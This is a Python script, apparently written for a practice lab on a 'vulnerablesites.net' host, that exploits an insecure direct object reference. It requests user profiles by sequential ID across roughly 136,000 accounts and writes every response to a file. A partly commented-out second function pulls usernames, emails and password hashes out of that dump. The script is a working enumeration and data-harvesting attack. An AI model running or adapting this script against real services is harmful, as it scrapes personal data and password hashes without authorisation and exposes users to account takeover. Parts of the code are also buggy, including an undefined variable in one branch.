import urllib.request
import string
import requests
import sys, json
import os

# def case1():
#     return val

# Makes list of all user accounts and saves them to file
def create(file):
    print("Creating file and filling... ")
    for x in range(200000, 335965): 
        URL = "https://13-52-248-112-shred.vulnerablesites.net/Shred/user_profile?id="
        new_url = URL + str(x)
        # print(str(x))

        resp = urllib.request.urlopen(new_url)
        data = resp.read()
        # string = json.loads(data)    # obj now contains a dict of the data

        string = str(data).replace("b'", "")
        string = string.replace("'", '')
        file.write(string+"\n")
        # print(string)
    print("Done creating done\n")
    # file.close() 



# for i in file:
#     header, data, signature = jwt.split(".")

def separate(file):
    # file = open("test1.txt", "r")
    for a in file:
        # print(line)
        # x = str(line)
        # obj = json.loads(line)  
        # y = json.dumps(a)
        x = json.loads(a)
        # type(x)
        # print(x)

        # y = json.loads(a)

        # print(y["profile"])
        # user = json.dumps(x["profile"]["username"], indent=4)
        # fileUsers = open("users.txt", "a+")
        # users = user.replace('"', '')
        # fileUsers.write(users+"\n")


        # email = json.dumps(x["profile"]["email"], indent=4)
        # fileEmails = open("emails.txt", "a+")
        # emails = email.replace('"', '')
        # fileEmails.write(emails+"\n")


        # hash = json.dumps(x["profile"]["password_hash"], indent=4)
        # fileHash = open("hash.txt", "a+")
        # hashs = hash.replace('"', '')
        # fileHash.write(hashs+"\n")

        # id = json.dumps(x["profile"]["user_id"], indent=4)
        # fileID = open("user_id.txt", "a+")
        # ids = id.replace('"', '')
        # fileID.write(ids+"\n")


    print("user done")







# print("Please choose:")
val = input("Enter your value: \n 1 = Create\n 2 = seperate \n 0 = Quit\n") 
val = int(val)
# print(type (val)) 
if val == 1:
    print("#1: Create file\r\n")
    print("new file")
    file_name = input("Enter a file name to check existance:\r\n" )
    if os.path.exists(file_name):
        print(file_name + "is already here")
    else:
        file = open(file_name, "a+")
        create(file)
        val = input("Enter your value: \n 1 = Create\n 2 = seperate \n 0 = Quit\n") 
        print(val+"chosen \n") 
elif val == 2:
    # sets file up to be added to
    if os.path.exists("test1.txt"):
        # os.remove("test1.txt")
        # reMake = open("test1.txt","w+")
        # create(reMake)
        file = open("test1.txt", "r")
        separate(file)
    else:
        print(file_name + "does not exist")
        val = input("Enter your value: \n 1 = Create\n 2 = seperate \n 0 = Quit\n") 
        print(val+"chosen \n") 
elif val == 0:
    print("bye")
    

